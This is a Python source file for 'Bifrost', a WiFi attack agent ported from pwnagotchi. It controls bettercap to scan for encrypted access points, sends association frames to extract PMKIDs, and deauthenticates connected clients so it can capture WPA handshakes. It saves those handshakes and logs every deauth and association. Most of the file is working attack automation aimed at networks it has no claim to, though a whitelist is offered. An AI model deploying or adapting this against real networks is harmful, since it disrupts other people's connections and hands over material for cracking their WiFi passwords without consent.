"""agent.py - Bifrost WiFi recon agent.

Ported from pwnagotchi/agent.py using composition instead of inheritance.
"""
import time
import json
import os
import re
import asyncio
import threading
import logging

from bifrost.bettercap import BettercapClient
from bifrost.automata import BifrostAutomata
from bifrost.epoch import BifrostEpoch
from bifrost.voice import BifrostVoice
from bifrost import plugins

from logger import Logger

logger = Logger(name="bifrost.agent", level=logging.DEBUG)


class BifrostAgent:
    """WiFi recon agent - drives bettercap, captures handshakes, tracks epochs."""

    def __init__(self, shared_data, stop_event=None):
        self.shared_data = shared_data
        self._config = shared_data.config
        self.db = shared_data.db
        self._stop_event = stop_event or threading.Event()

        # Sub-systems
        cfg = self._config
        self.bettercap = BettercapClient(
            hostname=cfg.get('bifrost_bettercap_host', '127.0.0.1'),
            scheme='http',
            port=int(cfg.get('bifrost_bettercap_port', 8081)),
            username=cfg.get('bifrost_bettercap_user', 'user'),
            password=cfg.get('bifrost_bettercap_pass', 'pass'),
        )
        self.automata = BifrostAutomata(cfg)
        self.epoch = BifrostEpoch(cfg)
        self.voice = BifrostVoice()

        self._started_at = time.time()
        self._filter = None
        flt = cfg.get('bifrost_filter', '')
        if flt:
            try:
                self._filter = re.compile(flt)
            except re.error:
                logger.warning("Invalid bifrost_filter regex: %s", flt)

        self._current_channel = 0
        self._tot_aps = 0
        self._aps_on_channel = 0
        self._supported_channels = list(range(1, 15))

        self._access_points = []
        self._last_pwnd = None
        self._history = {}
        self._handshakes = {}
        self.mode = 'auto'

        # Whitelist
        self._whitelist = [
            w.strip().lower() for w in
            str(cfg.get('bifrost_whitelist', '')).split(',') if w.strip()
        ]
        # Channels
        self._channels = [
            int(c.strip()) for c in
            str(cfg.get('bifrost_channels', '')).split(',') if c.strip()
        ]

        # Ensure handshakes dir
        hs_dir = cfg.get('bifrost_bettercap_handshakes', '/root/bifrost/handshakes')
        if hs_dir and not os.path.exists(hs_dir):
            try:
                os.makedirs(hs_dir, exist_ok=True)
            except OSError:
                pass

    # ── Lifecycle ─────────────────────────────────────────

    def start(self):
        """Initialize bettercap, start monitor mode, begin event polling."""
        self._wait_bettercap()
        self.setup_events()
        self.automata.set_starting()
        self._log_activity('system', 'Bifrost starting', self.voice.on_starting())
        self.start_monitor_mode()
        self.start_event_polling()
        self.start_session_fetcher()
        self.next_epoch()
        self.automata.set_ready()
        self._log_activity('system', 'Bifrost ready', self.voice.on_ready())

    def setup_events(self):
        """Silence noisy bettercap events."""
        logger.info("connecting to %s ...", self.bettercap.url)
        silence = [
            'ble.device.new', 'ble.device.lost', 'ble.device.disconnected',
            'ble.device.connected', 'ble.device.service.discovered',
            'ble.device.characteristic.discovered',
            'mod.started', 'mod.stopped', 'update.available',
            'session.closing', 'session.started',
        ]
        for tag in silence:
            try:
                self.bettercap.run('events.ignore %s' % tag, verbose_errors=False)
            except Exception:
                pass

    def _reset_wifi_settings(self):
        iface = self._config.get('bifrost_iface', 'wlan0mon')
        self.bettercap.run('set wifi.interface %s' % iface)
        self.bettercap.run('set wifi.ap.ttl %d' % self._config.get('bifrost_personality_ap_ttl', 120))
        self.bettercap.run('set wifi.sta.ttl %d' % self._config.get('bifrost_personality_sta_ttl', 300))
        self.bettercap.run('set wifi.rssi.min %d' % self._config.get('bifrost_personality_min_rssi', -200))
        hs_dir = self._config.get('bifrost_bettercap_handshakes', '/root/bifrost/handshakes')
        self.bettercap.run('set wifi.handshakes.file %s' % hs_dir)
        self.bettercap.run('set wifi.handshakes.aggregate false')

    def start_monitor_mode(self):
        """Wait for monitor interface and start wifi.recon."""
        iface = self._config.get('bifrost_iface', 'wlan0mon')
        has_mon = False
        retries = 0

        while not has_mon and retries < 30 and not self._stop_event.is_set():
            try:
                s = self.bettercap.session()
                for i in s.get('interfaces', []):
                    if i['name'] == iface:
                        logger.info("found monitor interface: %s", i['name'])
                        has_mon = True
                        break
            except Exception:
                pass

            if not has_mon:
                logger.info("waiting for monitor interface %s ... (%d)", iface, retries)
                self._stop_event.wait(2)
                retries += 1

        if not has_mon:
            logger.warning("monitor interface %s not found after %d retries", iface, retries)

        # Detect supported channels
        try:
            from bifrost.compat import _build_utils_shim
            self._supported_channels = _build_utils_shim(self.shared_data).iface_channels(iface)
        except Exception:
            self._supported_channels = list(range(1, 15))

        logger.info("supported channels: %s", self._supported_channels)
        self._reset_wifi_settings()

        # Start wifi recon
        try:
            wifi_running = self._is_module_running('wifi')
            if wifi_running:
                self.bettercap.run('wifi.recon off; wifi.recon on')
                self.bettercap.run('wifi.clear')
            else:
                self.bettercap.run('wifi.recon on')
        except Exception as e:
            err_msg = str(e)
            if 'Operation not supported' in err_msg or 'EOPNOTSUPP' in err_msg:
                logger.error(
                    "wifi.recon failed: %s - Your WiFi chip likely does NOT support "
                    "monitor mode. The built-in Broadcom chip on Raspberry Pi Zero/Zero 2 "
                    "has limited monitor mode support. Use an external USB WiFi adapter "
                    "(e.g. Alfa AWUS036ACH, Panda PAU09) that supports monitor mode and "
                    "packet injection.", e)
                self._log_activity('error',
                                   'WiFi chip does not support monitor mode',
                                   'Use an external USB WiFi adapter with monitor mode support')
            else:
                logger.error("Error starting wifi.recon: %s", e)

    def _wait_bettercap(self):
        retries = 0
        while retries < 30 and not self._stop_event.is_set():
            try:
                self.bettercap.session()
                return
            except Exception:
                logger.info("waiting for bettercap API ...")
                self._stop_event.wait(2)
                retries += 1
        if not self._stop_event.is_set():
            raise Exception("bettercap API not available after 60s")

    def _is_module_running(self, module):
        try:
            s = self.bettercap.session()
            for m in s.get('modules', []):
                if m['name'] == module:
                    return m['running']
        except Exception:
            pass
        return False

    # ── Recon cycle ───────────────────────────────────────

    def recon(self):
        """Full-spectrum WiFi scan for recon_time seconds."""
        recon_time = self._config.get('bifrost_personality_recon_time', 30)
        max_inactive = 3
        recon_mul = 2

        if self.epoch.inactive_for >= max_inactive:
            recon_time *= recon_mul

        self._current_channel = 0

        if not self._channels:
            logger.debug("RECON %ds (all channels)", recon_time)
            try:
                self.bettercap.run('wifi.recon.channel clear')
            except Exception:
                pass
        else:
            ch_str = ','.join(map(str, self._channels))
            logger.debug("RECON %ds on channels %s", recon_time, ch_str)
            try:
                self.bettercap.run('wifi.recon.channel %s' % ch_str)
            except Exception as e:
                logger.error("Error setting recon channels: %s", e)

        self.automata.wait_for(recon_time, self.epoch, sleeping=False,
                               stop_event=self._stop_event)

    def _filter_included(self, ap):
        if self._filter is None:
            return True
        return (self._filter.match(ap.get('hostname', '')) is not None or
                self._filter.match(ap.get('mac', '')) is not None)

    def get_access_points(self):
        """Fetch APs from bettercap, filter whitelist and open networks."""
        aps = []
        try:
            s = self.bettercap.session()
            plugins.on("unfiltered_ap_list", s.get('wifi', {}).get('aps', []))
            for ap in s.get('wifi', {}).get('aps', []):
                enc = ap.get('encryption', '')
                if enc == '' or enc == 'OPEN':
                    continue
                hostname = ap.get('hostname', '').lower()
                mac = ap.get('mac', '').lower()
                prefix = mac[:8]
                if (hostname not in self._whitelist and
                    mac not in self._whitelist and
                    prefix not in self._whitelist):
                    if self._filter_included(ap):
                        aps.append(ap)
        except Exception as e:
            logger.error("Error getting APs: %s", e)

        aps.sort(key=lambda a: a.get('channel', 0))
        self._access_points = aps
        plugins.on('wifi_update', aps)
        self.epoch.observe(aps, list(self.automata.peers.values()))

        # Update DB with discovered networks
        self._persist_networks(aps)
        return aps

    def get_access_points_by_channel(self):
        """Get APs grouped by channel, sorted by density."""
        aps = self.get_access_points()
        grouped = {}
        for ap in aps:
            ch = ap.get('channel', 0)
            if self._channels and ch not in self._channels:
                continue
            grouped.setdefault(ch, []).append(ap)
        return sorted(grouped.items(), key=lambda kv: len(kv[1]), reverse=True)

    # ── Actions ───────────────────────────────────────────

    def _should_interact(self, who):
        if self._has_handshake(who):
            return False
        if who not in self._history:
            self._history[who] = 1
            return True
        self._history[who] += 1
        max_int = self._config.get('bifrost_personality_max_interactions', 3)
        return self._history[who] < max_int

    def _has_handshake(self, bssid):
        for key in self._handshakes:
            if bssid.lower() in key:
                return True
        return False

    def associate(self, ap, throttle=0):
        """Send association frame to trigger PMKID."""
        if self.automata.is_stale(self.epoch):
            return
        if (self._config.get('bifrost_personality_associate', True) and
                self._should_interact(ap.get('mac', ''))):
            try:
                hostname = ap.get('hostname', ap.get('mac', '?'))
                logger.info("ASSOC %s (%s) ch=%d rssi=%d",
                            hostname, ap.get('mac', ''), ap.get('channel', 0), ap.get('rssi', 0))
                self.bettercap.run('wifi.assoc %s' % ap['mac'])
                self.epoch.track(assoc=True)
                self._log_activity('assoc', 'Association: %s' % hostname,
                                   self.voice.on_assoc(hostname))
            except Exception as e:
                self.automata.on_error(ap.get('mac', ''), e)
            plugins.on('association', ap)
            if throttle > 0:
                time.sleep(throttle)

    def deauth(self, ap, sta, throttle=0):
        """Deauthenticate client to capture handshake."""
        if self.automata.is_stale(self.epoch):
            return
        if (self._config.get('bifrost_personality_deauth', True) and
                self._should_interact(sta.get('mac', ''))):
            try:
                logger.info("DEAUTH %s (%s) from %s ch=%d",
                            sta.get('mac', ''), sta.get('vendor', ''),
                            ap.get('hostname', ap.get('mac', '')), ap.get('channel', 0))
                self.bettercap.run('wifi.deauth %s' % sta['mac'])
                self.epoch.track(deauth=True)
                self._log_activity('deauth', 'Deauth: %s' % sta.get('mac', ''),
                                   self.voice.on_deauth(sta.get('mac', '')))
            except Exception as e:
                self.automata.on_error(sta.get('mac', ''), e)
            plugins.on('deauthentication', ap, sta)
            if throttle > 0:
                time.sleep(throttle)

    def set_channel(self, channel, verbose=True):
        """Hop to a specific WiFi channel."""
        if self.automata.is_stale(self.epoch):
            return
        wait = 0
        if self.epoch.did_deauth:
            wait = self._config.get('bifrost_personality_hop_recon_time', 10)
        elif self.epoch.did_associate:
            wait = self._config.get('bifrost_personality_min_recon_time', 5)

        if channel != self._current_channel:
            if self._current_channel != 0 and wait > 0:
                logger.debug("waiting %ds on channel %d", wait, self._current_channel)
                self.automata.wait_for(wait, self.epoch, stop_event=self._stop_event)
            try:
                self.bettercap.run('wifi.recon.channel %d' % channel)
                self._current_channel = channel
                self.epoch.track(hop=True)
                plugins.on('channel_hop', channel)
            except Exception as e:
                logger.error("Error setting channel: %s", e)

    def next_epoch(self):
        """Transition to next epoch - evaluate mood."""
        self.automata.next_epoch(self.epoch)
        # Persist epoch to DB
        data = self.epoch.data()
        self._persist_epoch(data)
        self._log_activity('epoch', 'Epoch %d' % (self.epoch.epoch - 1),
                           self.voice.on_epoch(self.epoch.epoch - 1))

    # ── Event polling ─────────────────────────────────────

    def start_event_polling(self):
        """Start event listener in background thread.

        Tries websocket first; falls back to REST polling if the
        ``websockets`` package is not installed.
        """
        t = threading.Thread(target=self._event_poller, daemon=True, name="BifrostEvents")
        t.start()

    def _event_poller(self):
        try:
            self.bettercap.run('events.clear')
        except Exception:
            pass

        # Probe once whether websockets is available
        try:
            import websockets  # noqa: F401
            has_ws = True
        except ImportError:
            has_ws = False
            logger.warning("websockets package not installed - using REST event polling "
                           "(pip install websockets for real-time events)")

        if has_ws:
            self._ws_event_loop()
        else:
            self._rest_event_loop()

    def _ws_event_loop(self):
        """Websocket-based event listener (preferred)."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        while not self._stop_event.is_set():
            try:
                loop.run_until_complete(self.bettercap.start_websocket(
                    self._on_event, self._stop_event))
            except Exception as ex:
                if self._stop_event.is_set():
                    break
                logger.debug("Event poller error: %s", ex)
                self._stop_event.wait(5)
        loop.close()

    def _rest_event_loop(self):
        """REST-based fallback event poller - polls /api/events every 2s."""
        while not self._stop_event.is_set():
            try:
                events = self.bettercap.events()
                for ev in (events or []):
                    tag = ev.get('tag', '')
                    if tag == 'wifi.client.handshake':
                        # Build a fake websocket message for the existing handler
                        import asyncio as _aio
                        _loop = _aio.new_event_loop()
                        _loop.run_until_complete(self._on_event(json.dumps(ev)))
                        _loop.close()
            except Exception as ex:
                logger.debug("REST event poll error: %s", ex)
            self._stop_event.wait(2)

    async def _on_event(self, msg):
        """Handle bettercap websocket events."""
        try:
            jmsg = json.loads(msg)
        except json.JSONDecodeError:
            return

        if jmsg.get('tag') == 'wifi.client.handshake':
            filename = jmsg.get('data', {}).get('file', '')
            sta_mac = jmsg.get('data', {}).get('station', '')
            ap_mac = jmsg.get('data', {}).get('ap', '')
            key = "%s -> %s" % (sta_mac, ap_mac)

            if key not in self._handshakes:
                self._handshakes[key] = jmsg
                self._last_pwnd = ap_mac

                # Find AP info
                ap_name = ap_mac
                try:
                    s = self.bettercap.session()
                    for ap in s.get('wifi', {}).get('aps', []):
                        if ap.get('mac') == ap_mac:
                            if ap.get('hostname') and ap['hostname'] != '<hidden>':
                                ap_name = ap['hostname']
                            break
                except Exception:
                    pass

                logger.warning("!!! HANDSHAKE: %s -> %s !!!", sta_mac, ap_name)
                self.epoch.track(handshake=True)
                self._persist_handshake(ap_mac, sta_mac, ap_name, filename)
                self._log_activity('handshake',
                                   'Handshake: %s' % ap_name,
                                   self.voice.on_handshakes(1))
                plugins.on('handshake', filename, ap_mac, sta_mac)

    def start_session_fetcher(self):
        """Start background thread that polls bettercap for stats."""
        t = threading.Thread(target=self._fetch_stats, daemon=True, name="BifrostStats")
        t.start()

    def _fetch_stats(self):
        while not self._stop_event.is_set():
            try:
                s = self.bettercap.session()
                self._tot_aps = len(s.get('wifi', {}).get('aps', []))
            except Exception:
                pass
            self._stop_event.wait(2)

    # ── Status for web API ────────────────────────────────

    def get_status(self):
        """Return current agent state for the web API."""
        return {
            'mood': self.automata.mood,
            'face': self.automata.face,
            'voice': self.automata.voice_text,
            'channel': self._current_channel,
            'num_aps': self._tot_aps,
            'num_handshakes': len(self._handshakes),
            'uptime': int(time.time() - self._started_at),
            'epoch': self.epoch.epoch,
            'mode': self.mode,
            'last_pwnd': self._last_pwnd or '',
            'reward': self.epoch.data().get('reward', 0),
        }

    # ── DB persistence ────────────────────────────────────

    def _persist_networks(self, aps):
        """Upsert discovered networks to DB."""
        for ap in aps:
            try:
                self.db.execute(
                    """INSERT INTO bifrost_networks
                       (bssid, essid, channel, encryption, rssi, vendor, num_clients, last_seen)
                       VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                       ON CONFLICT(bssid) DO UPDATE SET
                       essid=?, channel=?, encryption=?, rssi=?, vendor=?,
                       num_clients=?, last_seen=CURRENT_TIMESTAMP""",
                    (ap.get('mac', ''), ap.get('hostname', ''), ap.get('channel', 0),
                     ap.get('encryption', ''), ap.get('rssi', 0), ap.get('vendor', ''),
                     len(ap.get('clients', [])),
                     ap.get('hostname', ''), ap.get('channel', 0),
                     ap.get('encryption', ''), ap.get('rssi', 0), ap.get('vendor', ''),
                     len(ap.get('clients', [])))
                )
            except Exception as e:
                logger.debug("Error persisting network: %s", e)

    def _persist_handshake(self, ap_mac, sta_mac, ap_name, filename):
        try:
            self.db.execute(
                """INSERT OR IGNORE INTO bifrost_handshakes
                   (ap_mac, sta_mac, ap_essid, filename)
                   VALUES (?, ?, ?, ?)""",
                (ap_mac, sta_mac, ap_name, filename)
            )
        except Exception as e:
            logger.debug("Error persisting handshake: %s", e)

    def _persist_epoch(self, data):
        try:
            self.db.execute(
                """INSERT INTO bifrost_epochs
                   (epoch_num, started_at, duration_secs, num_deauths, num_assocs,
                    num_handshakes, num_hops, num_missed, num_peers, mood, reward,
                    cpu_load, mem_usage, temperature, meta_json)
                   VALUES (?, datetime('now'), ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (self.epoch.epoch - 1, data.get('duration_secs', 0),
                 data.get('num_deauths', 0), data.get('num_associations', 0),
                 data.get('num_handshakes', 0), data.get('num_hops', 0),
                 data.get('missed_interactions', 0), data.get('num_peers', 0),
                 self.automata.mood, data.get('reward', 0),
                 data.get('cpu_load', 0), data.get('mem_usage', 0),
                 data.get('temperature', 0), '{}')
            )
        except Exception as e:
            logger.debug("Error persisting epoch: %s", e)

    def _log_activity(self, event_type, title, details=''):
        """Log an activity event to the DB."""
        self.automata.voice_text = details or title
        try:
            self.db.execute(
                """INSERT INTO bifrost_activity (event_type, title, details)
                   VALUES (?, ?, ?)""",
                (event_type, title, details)
            )
        except Exception as e:
            logger.debug("Error logging activity: %s", e)
